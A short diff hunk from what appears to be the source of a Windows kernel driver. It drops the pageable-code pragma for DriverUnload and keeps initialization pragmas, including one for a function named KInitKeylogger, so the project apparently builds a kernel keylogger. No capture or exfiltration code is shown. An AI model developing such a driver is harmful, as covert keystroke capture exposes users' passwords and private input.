@@ -17,7 +17,6 @@ extern "C" {
 
 #ifdef ALLOC_PRAGMA
 #pragma alloc_text(INIT, DriverEntry)
-#pragma alloc_text(PAGE, DriverUnload)
 #pragma alloc_text(INIT, KInitKeylogger)
 #endif
 
